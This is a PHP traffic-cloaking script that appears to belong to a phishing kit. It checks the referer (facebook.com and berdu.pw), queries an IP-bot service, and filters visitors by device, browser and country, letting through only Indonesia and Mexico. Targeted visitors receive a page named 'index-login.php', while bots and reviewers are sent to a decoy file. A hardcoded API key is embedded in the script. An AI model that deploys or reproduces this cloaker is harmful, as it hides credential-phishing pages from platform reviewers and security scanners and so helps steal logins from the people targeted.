<?php

$config = [
    'api_key' => 'Q6hvGrRGVK8fOqG6MfnepeFiVWUhosW9bp2HS73LoQdpouPqX5', // IPBOT API Key
    'bot_file' => 'index-jkrta.php', // If BOT File Location
    'not_bot_file' => 'index-login.php', // If Not BOT File Location
    'allowed_countries' => [ 'ID', 'MX' ], // Allowed Country Code
    'allowed_referer' => 'facebook.com', // Allowed Cloack
    'allowed_referer2' => 'berdu.pw', // Allowed Cloack 2
];

function ipbot_require_file($file_location) {
    if (file_exists($file_location)) {
        return require_once($file_location);
    }
}

$referer = strtolower(@$_SERVER['HTTP_REFERER']);
if (strpos($referer, $config['allowed_referer']) !== false || strpos($referer, $config['allowed_referer2']) !== false) {
    $ipbot_curl = curl_init();
    curl_setopt_array($ipbot_curl, [
        CURLOPT_URL => 'https://ipbot.info/api/check',
        CURLOPT_POST => TRUE,
        CURLOPT_POSTFIELDS => http_build_query([
            'ip_address' => $_SERVER['REMOTE_ADDR']
        ]),
        CURLOPT_HTTPHEADER => [
            'Authorization: ' . $config['api_key'],
            'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']
        ],
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_FOLLOWLOCATION => TRUE
    ]); $ipbot_response = curl_exec($ipbot_curl);
    curl_close($ipbot_curl);
    
    if ($ipbot_response) {
        $ipbot_response = json_decode($ipbot_response);
        if (!empty($ipbot_response->status) && $ipbot_response->status !== false) {
            $ipbot_data = $ipbot_response->data;
            $ipbot_lookup = $ipbot_data->lookup;
            
            // if ($ipbot_data->is_bot == true) {
            //     ipbot_require_file($config['bot_file']);
            //     exit;
            // }
            
            if ($ipbot_data->is_device_allowed == false) {
                ipbot_require_file($config['bot_file']);
                exit;
            }
            
            if ($ipbot_data->is_browser_allowed == false) {
                ipbot_require_file($config['bot_file']);
                exit;
            }
            
            if ($ipbot_data->is_country_allowed == false) {
                ipbot_require_file($config['bot_file']);
                exit;
            }
            
            if (!in_array($ipbot_lookup->country_code, $config['allowed_countries'])) {
                ipbot_require_file($config['bot_file']);
                exit;
            }
        }
    }
    
    ipbot_require_file($config['not_bot_file']);
    exit;
} else {
    ipbot_require_file($config['bot_file']);
    exit;
}